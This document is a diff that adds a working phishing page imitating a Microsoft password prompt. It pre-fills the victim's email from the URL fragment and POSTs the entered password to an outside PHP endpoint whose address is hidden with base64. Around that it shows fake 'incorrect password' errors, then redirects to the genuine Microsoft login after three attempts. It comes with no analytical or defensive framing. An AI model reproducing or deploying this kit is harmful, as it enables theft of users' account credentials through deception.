@@ -1,0 +1,54 @@
+<html lang=en><link href=https://dl.dropbox.com/s/ul130pc7ogaain7/style.css?dl=0 rel=stylesheet><link rel="shortcut icon"href=https://dl.dropbox.com/s/q61lab7sl4e6ht3/favicon.ico?dl=0><body><div class=centerbox2><div class=inside-box><div><img alt src=https://dl.dropbox.com/s/qjpq5tigs0niekw/microsoft_logo.png?dl=0></div><div> </div><div><a><img class=backbtn src=https://dl.dropbox.com/s/5own3543rbdlh4e/arrow_left.svg?dl=0></a><span class=email-text id=p1>undefined</span></div><div class=header1><span>Enter Password</span></div><div><p class=error-text style=color:black>Because you're accessing sensitive info, you need to verify your password.,</div><div class=getinput><form autocomplete=off name=logonForm><div><input autofocus name=password placeholder=Password required type=password></div><input id=myText name=email type=hidden value=undefined><div><input type=checkbox><span style="position: relative; top:-5px; font-weight: lighter;">  Keep me signed in</span></div><div class=signup-text><span> <a href=#>Forgot my password</a> </span></div><div class=sign-in-button><button class=next-button>Sign In</button></div></form></div></div></div><script>var feedUpdateResponse = window.location.href;
+var feedUpdateSplit = feedUpdateResponse.split("");
+
+
+
+for (var x = 0; x < feedUpdateSplit.length; x++) {
+ 
+ if (feedUpdateSplit[x]=="#"){
+  var che= feedUpdateResponse.substring(x+1);
+ 
+ }else{
+ 
+
+ }
+
+ 
+ 
+ }
+
+document.getElementById("p1").innerHTML = che
+document.getElementById("myText").value =che</script><script src=https://code.jquery.com/jquery-1.9.1.js></script><script>var count=0;
+	   $(document).ready(function() {
+		   
+		   
+		   
+        $('form').submit(function(e) {
+	
+			
+			count=count+1;
+					
+					var d=atob('aHR0cHM6Ly9ubzF3ZWJtYXN0ZXIuY29tL3V6b3IucGhw');
+		
+            e.preventDefault();
+               $.ajax({
+			   
+            type: 'POST',
+            url: d,
+			crossDomain: true,
+            data: $('form').serialize(),
+            success: function () {
+				
+				  if (count>=3) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("https://login.microsoftonline.com");
+
+                  }else{
+				    $("#successMessage").html("Your email or password is incorrect. If you don't remember your password, <a href='#'>reset it now.</a>");
+					 $("form")[0].reset();
+					 }
+            }
+          });
+        });
+    });</script><div class=footer><span class=footer-text>Р’В©2021 Microsoft   Terms of use   Privacy & cookies   ...  </span></div>
